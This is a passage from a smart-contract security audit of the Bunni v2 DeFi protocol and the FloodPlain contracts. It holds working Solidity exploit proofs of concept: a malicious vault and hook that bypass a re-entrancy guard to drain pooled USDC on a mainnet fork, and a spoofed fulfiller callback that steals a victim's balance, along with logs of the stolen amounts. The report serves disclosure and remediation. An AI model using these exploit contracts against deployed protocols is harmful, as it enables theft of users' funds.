        uint256 currentTotalSupply = state.bunniToken.totalSupply();
        uint256 shares;

        // burn shares
        if (params.useQueuedWithdrawal) {
            ...
        } else {
            shares = params.shares;
            state.bunniToken.burn(msgSender, shares);
        }
        // at this point of execution we know shares <= currentTotalSupply
        // since otherwise the burn() call would've reverted

        // compute token amount to withdraw and the component amounts

        uint256 reserveAmount0 =
            getReservesInUnderlying(state.reserve0.mulDiv(shares, currentTotalSupply), state.vault0);
        uint256 reserveAmount1 =
            getReservesInUnderlying(state.reserve1.mulDiv(shares, currentTotalSupply), state.vault1);

        uint256 rawAmount0 = state.rawBalance0.mulDiv(shares, currentTotalSupply);
        uint256 rawAmount1 = state.rawBalance1.mulDiv(shares, currentTotalSupply);

        amount0 = reserveAmount0 + rawAmount0;
        amount1 = reserveAmount1 + rawAmount1;

        if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
            revert BunniHub__SlippageTooHigh();
        }

        // decrease idle balance proportionally to the amount removed
        {
            (uint256 balance, bool isToken0) = IdleBalanceLibrary.fromIdleBalance(state.idleBalance);
            uint256 newBalance = balance - balance.mulDiv(shares, currentTotalSupply);
            if (newBalance != balance) {
                s.idleBalance[poolId] = newBalance.toIdleBalance(isToken0);
            }
        }

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        // withdraw reserve tokens
        if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
            // vault used
            // withdraw reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount0, params.poolKey.currency0, state.vault0, params.recipient, env.weth
            );
            s.reserve0[poolId] = state.reserve0 - reserveChange;
        }
        if (address(state.vault1) != address(0) && reserveAmount1 != 0) {
            // vault used
            // withdraw from reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount1, params.poolKey.currency1, state.vault1, params.recipient, env.weth
            );
            s.reserve1[poolId] = state.reserve1 - reserveChange;
        }

        // withdraw raw tokens
        env.poolManager.unlock(
            abi.encode(
                BunniHub.UnlockCallbackType.WITHDRAW,
                abi.encode(params.recipient, params.poolKey, rawAmount0, rawAmount1)
            )
        );

        ...
    }
```

This vector is notably more straightforward as the pulled reserve tokens are transferred immediately to the caller:

```solidity
function _withdrawVaultReserve(uint256 amount, Currency currency, ERC4626 vault, address user, WETH weth)
    internal
    returns (uint256 reserveChange)
{
    if (currency.isAddressZero()) {
        // withdraw WETH from vault to address(this)
        reserveChange = vault.withdraw(amount, address(this), address(this));

        // burn WETH for ETH
        weth.withdraw(amount);

        // transfer ETH to user
        user.safeTransferETH(amount);
    } else {
        // normal ERC20
        reserveChange = vault.withdraw(amount, user, address(this));
    }
}
```

A slightly less impactful but still critical alternative would be for a malicious fulfiller of a Flood Plain rebalance order to re-enter during the `IFulfiller::sourceConsideration` call. This assumes that the attacker holds the top bid and is set as the am-AMM manager. It is equivalent to the Pashov Group finding C-03 and remains possible despite the implementation of the recommended mitigation due to the re-entrancy guard override described above.

**Proof of Concept:** To run the following PoCs:
* Add the following malicious vault implementation inside `test/mocks/ERC4626Mock.sol`:

```solidity
interface MaliciousHook {
    function continueAttackFromMaliciousVault() external;
}

contract MaliciousERC4626 is ERC4626 {
    address internal immutable _asset;
    MaliciousHook internal immutable maliciousHook;
    bool internal attackStarted;

    constructor(IERC20 asset_, address _maliciousHook) {
        _asset = address(asset_);
        maliciousHook = MaliciousHook(_maliciousHook);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }

    function setupAttack() external {
        attackStarted = true;
    }

    function previewRedeem(uint256 shares) public view override returns (uint256 assets) {
        return type(uint128).max;
    }

    function withdraw(uint256 assets, address to, address owner) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.withdraw(assets, to, owner);
        }
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.deposit(assets, to);
        }
    }
}
```

This vault implementation is just a normal ERC-4626 that can be switched into forwarding the execution to a malicious hook during withdraw and deposit functions. These are the methods that the `BunniHub` will use in order to reach the `targetRawBalance`.

* Inside `test/BaseTest.sol`, change the following import:

```diff
--	import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++	import {ERC4626Mock, MaliciousERC4626} from "./mocks/ERC4626Mock.sol";
```

* Inside `test/BunniHub.t.sol`, paste the following malicious hook contract outside of the `BunniHubTest` contract:

```solidity
import {IAmAmm} from "biddog/interfaces/IAmAmm.sol";

enum Vector {
    HOOK_HANDLE_SWAP,
    WITHDRAW
}

contract CustomHook {
    uint256 public reentrancyIterations;
    uint256 public iterationsCounter;
    IBunniHub public hub;
    PoolKey public key;
    address public vault;
    Vector public vec;
    uint256 public amountOfReservesToWithdraw;
    uint256 public sharesToWithdraw;
    IPoolManager public poolManager;
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    function isValidParams(bytes calldata hookParams) external pure returns (bool) {
        return true;
    }

    function slot0s(PoolId id)
        external
        view
        returns (uint160 sqrtPriceX96, int24 tick, uint32 lastSwapTimestamp, uint32 lastSurgeTimestamp)
    {
        int24 minTick = TickMath.MIN_TICK;
        (sqrtPriceX96, tick, lastSwapTimestamp, lastSurgeTimestamp) = (TickMath.getSqrtPriceAtTick(tick), tick, 0, 0);
    }

    function getTopBidWrite(PoolId id) external view returns (IAmAmm.Bid memory topBid) {
        topBid = IAmAmm.Bid({manager: address(0), blockIdx: 0, payload: 0, rent: 0, deposit: 0});
    }

    function getAmAmmEnabled(PoolId id) external view returns (bool) {
        return false;
    }

    function canWithdraw(PoolId id) external view returns (bool) {
        return true;
    }

    function afterInitialize(address caller, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick)
        external
        returns (bytes4)
    {
        return BunniHook.afterInitialize.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
        external
        returns (bytes4, int256, uint24)
    {
        return (BunniHook.beforeSwap.selector, 0, 0);
    }

    function depositInitialReserves(
        address token,
        uint256 amount,
        address _hub,
        IPoolManager _poolManager,
        PoolKey memory _key,
        bool zeroForOne
    ) external {
        key = _key;
        hub = IBunniHub(_hub);
        poolManager = _poolManager;
        poolManager.setOperator(_hub, true);
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, zeroForOne));
        poolManager.unlock(abi.encode(uint8(1), address(0), amount, msg.sender, zeroForOne));
    }

    function mintERC6909(address token, uint256 amount) external {
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, true));
    }

    function mintBunniToken(PoolKey memory _key, uint256 _amount0, uint256 _amount1)
        external
        returns (uint256 shares)
    {
        IERC20(Currency.unwrap(_key.currency0)).transferFrom(msg.sender, address(this), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).transferFrom(msg.sender, address(this), _amount1);

        IERC20(Currency.unwrap(_key.currency0)).approve(address(PERMIT2), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).approve(address(PERMIT2), _amount1);
        PERMIT2.approve(Currency.unwrap(_key.currency0), address(hub), uint160(_amount0), type(uint48).max);
        PERMIT2.approve(Currency.unwrap(_key.currency1), address(hub), uint160(_amount1), type(uint48).max);

        (shares,,) = IBunniHub(hub).deposit(
            IBunniHub.DepositParams({
                poolKey: _key,
                amount0Desired: _amount0,
                amount1Desired: _amount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(this),
                refundRecipient: address(this),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            })
        );
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory result) {
        (uint8 mode, address token, uint256 amount, address spender, bool zeroForOne) =
            abi.decode(data, (uint8, address, uint256, address, bool));
        if (mode == 0) {
            poolManager.sync(Currency.wrap(token));
            IERC20(token).transferFrom(spender, address(poolManager), amount);
            uint256 deltaAmount = poolManager.settle();
            poolManager.mint(address(this), Currency.wrap(token).toId(), deltaAmount);
        } else if (mode == 1) {
            hub.hookHandleSwap(key, zeroForOne, amount, 0);
        } else if (mode == 2) {
            hub.hookHandleSwap(key, false, 1, amountOfReservesToWithdraw);
        }
    }

    function initiateAttack(
        IBunniHub _hub,
        PoolKey memory _key,
        address _targetVault,
        uint256 _amountToWithdraw,
        Vector _vec,
        uint256 iterations
    ) public {
        reentrancyIterations = iterations;
        hub = _hub;
        key = _key;
        vault = _targetVault;
        vec = _vec;
        if (vec == Vector.HOOK_HANDLE_SWAP) {
            amountOfReservesToWithdraw = _amountToWithdraw;
            poolManager.unlock(abi.encode(uint8(2), address(0), amountOfReservesToWithdraw, msg.sender, true));
        } else if (vec == Vector.WITHDRAW) {
            sharesToWithdraw = _amountToWithdraw;
            hub.withdraw(
                IBunniHub.WithdrawParams({
                    poolKey: _key,
                    recipient: address(this),
                    shares: sharesToWithdraw,
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: block.timestamp,
                    useQueuedWithdrawal: false
                })
            );
        }
    }

    function continueAttackFromMaliciousVault() public {
        if (iterationsCounter != reentrancyIterations) {
            iterationsCounter++;
            disableReentrancyGuard();

            if (vec == Vector.HOOK_HANDLE_SWAP) {
                hub.hookHandleSwap(
                    key, false, 1, /* amountToDeposit to trigger the updateIfNeeded */ amountOfReservesToWithdraw
                );
            } else if (vec == Vector.WITHDRAW) {
                sharesToWithdraw /= 2;

                hub.withdraw(
                    IBunniHub.WithdrawParams({
                        poolKey: key,
                        recipient: address(this),
                        shares: sharesToWithdraw,
                        amount0Min: 0,
                        amount1Min: 0,
                        deadline: block.timestamp,
                        useQueuedWithdrawal: false
                    })
                );
            }
        }
    }

    function disableReentrancyGuard() public {
        hub.unlockForRebalance(key);
    }

    fallback() external payable {}
}
```

* With all of the above, this test can be run from inside `test/BunniHub.t.sol`:

```solidity
function test_ForkHookHandleSwapDrainRawBalancePoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(USDC);
    IERC20 token1 = IERC20(WETH);
    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token1, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool to steal reserve balances
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(USDCVault)),
            vault1: ERC4626(address(maliciousVault)),
            minRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            targetRawTokenRatio0: 1e6,      // set to 100% to have all funds in raw balance
            maxRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            minRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            targetRawTokenRatio1: 0,        // set to 0% to trigger a deposit upon transferring 1 token
            maxRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 10_000e6; // Using a big amount in order to not execute too many reentrancy iterations, but it works with whatever amount
    deal(address(token0), address(this), initialToken0Deposit);
    deal(address(token1), address(this), initialToken0Deposit);
    token0.approve(customHook, initialToken0Deposit);
    token1.approve(customHook, initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token0), initialToken0Deposit, address(hub), poolManager, maliciousKey, true
    );
    CustomHook(payable(customHook)).mintERC6909(address(token1), initialToken0Deposit);

    console.log(
        "BunniHub token0 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve before", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance before",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)),
        maliciousKey,
        USDCVault,
        initialToken0Deposit,
        Vector.HOOK_HANDLE_SWAP,
        20
    );
    console.log(
        "BunniHub token0 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve after", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance after",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    console.log(
        "Stolen USDC",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId()) - initialToken0Deposit
    );
}
```

The execution does the following:
1. Calls `depositInitialReserves()` from the malicious hook which essentially deposits and accounts some raw balance into `BunniHub`.
2. Calls the `hookHandleSwap()` function inside `BunniHub` to withdraw the previously deposited amount.
3. The `BunniHub` transfers the tokens to the hook.
4. The `hookHandleSwap()` tries to reach the `targetRawBalance` of token1 and calls the `deposit()` into the malicious vault which forwards the execution back to the malicious hook.
5. The malicious hook calls the `unlockForRebalance()` function to disable the reentrancy protection.
6. The malicious hook reenters the `hookHandleSwap()` function the same way as step 2.

Once the function has been re-entered a sufficient number of times to drain all raw balances, the state will be set to 0 instead of decrementing, avoiding an underflow. The end result will be the malicious hook owning all ERC-6909 tokens previously held by the `BunniHub`.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainRawBalancePoC() (gas: 20540027)
Logs:
  BunniHub token0 raw balance before 219036268296
  BunniHub token0 vault reserve before 388807745471
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 9036268296
  BunniHub token0 vault reserve after 388807745471
  MaliciousHook token0 balance after 210000000000
  Stolen USDC 200000000000
```

It is also possible to drain all vault reserves held by the `BunniHub` by modifying the token ratio bounds of the malicious hook as follows:

```solidity
minRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
targetRawTokenRatio0: 0,        // set to 0% in order to have all deposited funds accounted into the vault
maxRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
```

With this modification, the target raw balance for the vault to drain is set to 0% in order to have all the liquidity accounted into the vault. This way, when the `BunniHub` attempts to transfer the funds to the hook, it will have to withdraw the funds from the vault which can be exploited to repeatedly burn vault shares from other pools.

The attack setup should also be modified slightly to calculate the optimal number of iterations:

```solidity
uint256 sharesToMint = ERC4626(USDCVault).previewDeposit(initialToken0Deposit) - 1e6;
CustomHook(payable(customHook)).initiateAttack(
    IBunniHub(address(hub)),
    maliciousKey,
    USDCVault,
    sharesToMint,
    Vector.HOOK_HANDLE_SWAP,
    ERC4626(USDCVault).balanceOf(address(hub)) / sharesToMint
);

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainReserveBalancePoC() (gas: 23881409)
Logs:
  BunniHub token0 raw balance before 209036268296
  BunniHub token0 vault reserve before 398583692087
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 209036268296
  BunniHub token0 vault reserve after 6790331257
  MaliciousHook token0 balance after 400772811256
  Stolen USDC 390772811256
```

A similar attack can be executed through withdrawal of malicious Bunni token shares as shown in the PoC below:

```solidity
function test_ForkWithdrawPoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(WETH);
    IERC20 token1 = IERC20(USDC);

    while (address(token0) > address(token1)) {
        token0 = IERC20(address(new ERC20Mock()));
    }

    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token0, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(maliciousVault)),
            vault1: ERC4626(address(USDCVault)),
            minRawTokenRatio0: 0,
            targetRawTokenRatio0: 0,
            maxRawTokenRatio0: 0,
            minRawTokenRatio1: 0,
            targetRawTokenRatio1: 0,
            maxRawTokenRatio1: 0,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 50_000 ether;
    uint256 initialToken1Deposit = 50_000e6;
    deal(address(token0), address(this), 2 * initialToken0Deposit);
    deal(address(token1), address(this), 2 * initialToken0Deposit);
    token0.approve(customHook, 2 * initialToken0Deposit);
    token1.approve(customHook, 2 * initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token1), initialToken1Deposit, address(hub), poolManager, maliciousKey, false
    );
    CustomHook(payable(customHook)).mintERC6909(address(token0), initialToken0Deposit);
    uint256 shares =
        CustomHook(payable(customHook)).mintBunniToken(maliciousKey, initialToken0Deposit, initialToken1Deposit);

    console.log(
        "BunniHub token1 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve before", ERC4626(USDCVault).maxWithdraw(address(hub)));
    uint256 hookBalanceBefore = token1.balanceOf(customHook);
    console.log("MaliciousHook token1 balance before", hookBalanceBefore);

    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)), maliciousKey, USDCVault, shares / 2, Vector.WITHDRAW, 17
    );
    console.log(
        "BunniHub token1 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve after", ERC4626(USDCVault).maxWithdraw(address(hub)));
    console.log("MaliciousHook token1 balance after", token1.balanceOf(customHook));
    console.log("USDC stolen", token1.balanceOf(customHook) - initialToken1Deposit);
}
```

Logs:
```bash
[PASS] test_ForkWithdrawPoC() (gas: 23086872)
Logs:
  BunniHub token1 raw balance before 209036268296
  BunniHub token1 vault reserve before 447718769054
  MaliciousHook token1 balance before 50000000000
  BunniHub token1 raw balance after 209036268296
  BunniHub token1 vault reserve after 3757038234
  MaliciousHook token1 balance after 493961730811
  USDC stolen 443961730811
```

**Impact:** Both vault reserves and raw balances from all legitimate pools can be fully withdrawn by a completely isolated and malicious pool configured with a custom hook that bypasses the `BunniHub` re-entrancy guard. At the time of this audit and associated disclosure, these funds were valued at $7.33M.

**Recommended Mitigation:** The root cause of the attack was the ability to disable the intended global re-entrancy protection by invoking `unlockForRebalance()` which was subsequently disabled. One solution would be to implement the rebalance re-entrancy protection on a per-pool basis such that one pool cannot manipulate the re-entrancy guard transient storage state of another. Additionally, allowing Bunni pools to be deployed with any arbitrary hook implementation greatly increases the attack surface. It is instead recommended to minimise this by constraining the hook to be the canonical `BunniHook` implementation such that it is not possible to call such `BunniHub` functions directly.

**Bacon Labs:** Fixed in [PR \#95](https://github.com/timeless-fi/bunni-v2/pull/95).

**Cyfrin:** Verified. `BunniHub::unlockForRebalance`has been removed to prevent reentrancy attacks and `BunniHub::hookGive`has been added in place of the `hookHandleSwap()` call within `_rebalancePosthookCallback()`; however, the absence of calls to `_updateRawBalanceIfNeeded()` to update the vault reserves has been noted. A hook whitelist has also been added to`BunniHub`.

**Bacon Labs:** `BunniHub::hookGive` is kept intentionally simple and avoids calling potentially malicious contracts such as vaults.

**Cyfrin:** Acknowledged. This will result in regular losses of potential yield as the deposit to the target ratios will not occur until the surge fee is such that swappers are no longer disincentivized, but it is understood to be accepted that the subsequent swap will trigger the deposit.

\clearpage
## High Risk


### `FloodPlain` selector extension does not prevent `IFulfiller::sourceConsideration` callback from being called within pre/post hooks

**Description:** The `FloodPlain` contracts implement a check in `Hooks::execute` which intends to prevent spoofing by invoking the fulfiller callback during execution of the pre/post hooks:

```solidity
    bytes28 constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));

    library Hooks {
        function execute(IFloodPlain.Hook calldata hook, bytes32 orderHash, address permit2) internal {
            address target = hook.target;
            bytes calldata data = hook.data;

            bytes28 extension; // @audit - an attacker can control this value to pass the below check
            assembly ("memory-safe") {
                extension := shl(32, calldataload(data.offset)) // @audit - this shifts off the first 4 bytes of the calldata, which is the `sourceConsideration()` function selector. thus preventing a call to either `sourceConsideration()` or `sourceConsiderations()` relies on the fulfiller requiring the `selectorExtension` argument to be `SELECTOR_EXTENSION`
            }
@>          require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");

            assembly ("memory-safe") {
                let fmp := mload(0x40)
                calldatacopy(fmp, data.offset, data.length)
                mstore(add(fmp, data.length), orderHash)
                if iszero(call(gas(), target, 0, fmp, add(data.length, 32), 0, 0)) {
                    returndatacopy(0, 0, returndatasize())
                    revert(0, returndatasize())
                }
            }
        }
        ...
    }
```

However, the `SELECTOR_EXTENSION` constant simply acts as a sort of "magic value" as it does not actually contain the hashed function signature. As such, assuming fulfillers validate selector extension argument against this expected value, this only prevent calls using the `IFulfiller::sourceConsiderations` interface and not `IFulfiller.sourceConsideration`. Therefore, a malicious Flood order can be fulfilled and used to target a victim fulfiller by executing the arbitrary external call during the pre/post hooks. If the caller is not explicitly validated, then it is possible that this call will be accepted by the fulfiller and potentially result in dangling approvals that can be later exploited. Additionally, this same selector extension is passed to the `IFulfiller::sourceConsideration` callback in both overloaded versions of `FloodPlain::fulfillOrder` when this should ostensibly be `bytes28(keccak256("IFulfiller.sourceConsideration"))`.

While the code is not currently public, this is the case for the Bunni rebalancer that simply only checks that `msg.sender` is the Flood contract and ignores the`selectorExtension` and `caller` parameters. As a result, it can be tricked into decoding an attacker-controlled address to which an infinite approval is made for the offer token. The malicious Flood order can freely control both the Flood order and accompanying context, meaning that they can drain any token inventory held by the rebalancer.

**Impact:** Malicious Flood orders can spoof the `FloodPlain` address by invoking the `IFulfiller::sourceConsideration` callback during execution of the pre/post hooks.

**Proof of Concept:** The following test can be added to the Flood.bid library tests in `Hooks.t.sol`:

```solidity
function test_RevertWhenSelectorExtensionClashSourceConsideration(
        bytes4 data0,
        bytes calldata data2,
        bytes32 orderHash,
        address permit2
    ) public {
        vm.assume(permit2 != hooked);
        bytes28 data1 = bytes28(keccak256("IFulfiller.sourceConsideration")); // note the absence of the final 's'
        bytes memory data = abi.encodePacked(data0, data1, data2);

        // this actually succeeds, so it is possible to call sourceConsideration on the fulfiller from the hook
        // with FloodPlain as the sender and any arbitrary caller before the consideration is actually sourced
        // which can be used to steal approvals from other contracts that integrate with FloodPlain
        hookHelper.execute(IFloodPlain.Hook({target: address(0x6969696969), data: data}), orderHash, permit2);
    }
```

And the standalone test file below demonstrates the full end-to-end issue:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "test/utils/FloodPlainTestShared.sol";

import {PermitHash} from "permit2/src/libraries/PermitHash.sol";
import {OrderHash} from "src/libraries/OrderHash.sol";

import {IFloodPlain} from "src/interfaces/IFloodPlain.sol";
import {IFulfiller} from "src/interfaces/IFulfiller.sol";
import {SELECTOR_EXTENSION} from "src/libraries/Hooks.sol";

import {IERC20, SafeERC20} from "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {Address} from "@openzeppelin/utils/Address.sol";

contract ThirdPartyFulfiller is IFulfiller {
    using SafeERC20 for IERC20;
    using Address for address payable;

    function sourceConsideration(
        bytes28 selectorExtension,
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256) {
        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")));

        IFloodPlain.Item calldata item = order.consideration;
        if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
        else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);

        return item.amount;
    }

    function sourceConsiderations(
        bytes28 selectorExtension,
        IFloodPlain.Order[] calldata orders,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256[] memory amounts) {
        require(selectorExtension == SELECTOR_EXTENSION);

        uint256[] memory amounts = new uint256[](orders.length);

        for (uint256 i; i < orders.length; ++i) {
            IFloodPlain.Order calldata order = orders[i];
            IFloodPlain.Item calldata item = order.consideration;
            amounts[i] = item.amount;
            if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
            else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
        }
    }
}

contract FloodPlainPoC is FloodPlainTestShared {
    IFulfiller victimFulfiller;

    function setUp() public override {
        super.setUp();
        victimFulfiller = new ThirdPartyFulfiller();
    }

    function test_FraudulentPreHookSourceConsideration() public {
        // create a malicious order that will call out to a third-party fulfiller in the pre hook
        // just copied the setup_mostBasicOrder logic for simplicity but this can be a fake order with fake tokens
        // since it is only the pre hook execution that is interesting here

        deal(address(token0), account0.addr, token0.balanceOf(account0.addr) + 500);
        deal(address(token1), address(fulfiller), token1.balanceOf(address(fulfiller)) + 500);
        IFloodPlain.Item[] memory offer = new IFloodPlain.Item[](1);
        offer[0].token = address(token0);
        offer[0].amount = 500;
        uint256 existingAllowance = token0.allowance(account0.addr, address(permit2));
        vm.prank(account0.addr);
        token0.approve(address(permit2), existingAllowance + 500);
        IFloodPlain.Item memory consideration;
        consideration.token = address(token1);
        consideration.amount = 500;

        // fund the victim fulfiller with native tokens that we will have it transfer out as the "consideration"
        uint256 targetAmount = 10 ether;
        deal(address(victimFulfiller), targetAmount);
        assertEq(address(victimFulfiller).balance, targetAmount);

        IFloodPlain.Item memory evilConsideration;
        evilConsideration.token = address(0);
        evilConsideration.amount = targetAmount;

        // now set up the spoofed sourceConsideration call (note the offer doesn't matter as this is not a legitimate order)
        IFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);
        IFloodPlain.Order memory maliciousOrder = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: evilConsideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: new IFloodPlain.Hook[](0),
            postHooks: new IFloodPlain.Hook[](0)
        });
        preHooks[0] = IFloodPlain.Hook({
            target: address(victimFulfiller),
